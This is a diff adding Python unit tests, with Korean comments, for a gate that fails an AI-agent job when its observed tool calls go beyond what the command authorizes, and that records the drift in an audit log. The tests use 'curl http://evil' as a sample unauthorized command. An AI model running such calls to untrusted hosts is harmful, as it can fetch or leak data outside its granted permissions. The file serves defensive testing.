@@ -192,3 +192,65 @@ class TestWorkerTrajectory:
         step = [e for e in audit.list_for_job(job.id) if e.action == AUDIT_TOOL_CALL][0]
         assert step.tool_name == "unresolved:Bash"
         assert step.detail == "curl http://evil"
+
+
+class TestCapabilityDriftGate:
+    """관측 capability 는 기록이 아니라 게이트다 — 넘으면 job 이 실패해야 한다."""
+
+    def _run(self, outcome: CommandOutcome, command: str = "pr"):
+        jobs = SqliteJobStore(clock=counter_clock(), id_factory=counter_id())
+        audit = SqliteAuditStore(clock=counter_clock())
+        metrics = SqliteTelemetryStore(clock=counter_clock())
+        worker = Worker(jobs, audit, metrics, executors={command: lambda _job: outcome})
+        job = jobs.enqueue(command, args="fix", source=JobSource.SLACK)
+        final = worker.process_one()
+        return job, audit, final
+
+    def test_authorized_calls_pass(self) -> None:
+        from app.store import JobStatus
+
+        outcome = CommandOutcome(
+            result="ok",
+            tool_steps=(ToolCall("t1", "Bash", "git status --porcelain", "", False),),
+        )
+        _job, _audit, final = self._run(outcome)
+        # 정상 경로에서 게이트는 조용하다 — 상시 거부로 퇴화하지 않았는지 확인.
+        assert final is not None and final.status is JobStatus.DONE
+
+    def test_unauthorized_argv_fails_the_job(self) -> None:
+        from app.store import JobStatus
+        from app.worker import AUDIT_CAPABILITY_DRIFT
+
+        # guard 를 우회해 실행된 것이 관측되면, 기록만 하고 넘어가면 안 된다.
+        outcome = CommandOutcome(
+            result="ok", tool_steps=(ToolCall("t1", "Bash", "curl http://evil", "", False),)
+        )
+        job, audit, final = self._run(outcome)
+        assert final is not None and final.status is JobStatus.FAILED
+        drift = [e for e in audit.list_for_job(job.id) if e.action == AUDIT_CAPABILITY_DRIFT]
+        assert len(drift) == 1
+        assert "does not authorize" in drift[0].context["reason"]
+
+    def test_drift_still_records_what_ran(self) -> None:
+        # 실패해도 궤적에 구멍이 생기면 안 된다.
+        outcome = CommandOutcome(
+            result="ok", tool_steps=(ToolCall("t1", "Bash", "curl http://evil", "", False),)
+        )
+        job, audit, _final = self._run(outcome)
+        steps = [e for e in audit.list_for_job(job.id) if e.action == AUDIT_TOOL_CALL]
+        assert [e.detail for e in steps] == ["curl http://evil"]
+
+    def test_capability_outside_the_authorized_set_fails(
+        self, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        from app.store import JobStatus
+
+        # tf-review 는 read 만 인가된다. write 도구가 관측되면 초과다.
+        monkeypatch.setattr(
+            "app.command_guard.resolve_tool", lambda _c, _l: "Bash(git push:*)"
+        )
+        outcome = CommandOutcome(
+            result="ok", tool_steps=(ToolCall("t1", "Bash", "terraform plan", "", False),)
+        )
+        _job, _audit, final = self._run(outcome, command="tf-review")
+        assert final is not None and final.status is JobStatus.FAILED
